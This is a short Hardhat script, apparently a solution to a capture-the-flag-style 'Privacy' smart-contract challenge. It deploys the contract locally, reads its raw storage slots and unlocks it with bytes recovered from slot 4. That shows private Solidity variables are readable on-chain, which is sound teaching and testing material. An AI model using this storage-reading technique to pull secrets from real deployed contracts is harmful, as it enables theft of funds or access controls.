const hre = require("hardhat");

async function main() {
  const [ownerDeployer, hacker] = await hre.ethers.getSigners();
  const provider = hre.ethers.provider;

  const nbr1 = ethers.utils.hexZeroPad(BigInt(150), 32);
  const nbr2 = ethers.utils.hexZeroPad(BigInt(595), 32);
  const nbr3 = ethers.utils.hexZeroPad(BigInt(15005), 32);

  const Privacy = await hre.ethers.getContractFactory("Privacy");
  const privacy = await Privacy.deploy([nbr1, nbr2, nbr3]);
  await privacy.deployed();

  const slot0 = await provider.getStorageAt(privacy.address, 0);
  const slot1 = await provider.getStorageAt(privacy.address, 1);
  const slot2 = await provider.getStorageAt(privacy.address, 2);
  const slot3 = await provider.getStorageAt(privacy.address, 3);
  const slot4 = await provider.getStorageAt(privacy.address, 4);
  const slot5 = await provider.getStorageAt(privacy.address, 5);

  await privacy.unlock(slot4.slice(0,34))

  console.log(await privacy.locked() == false)

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
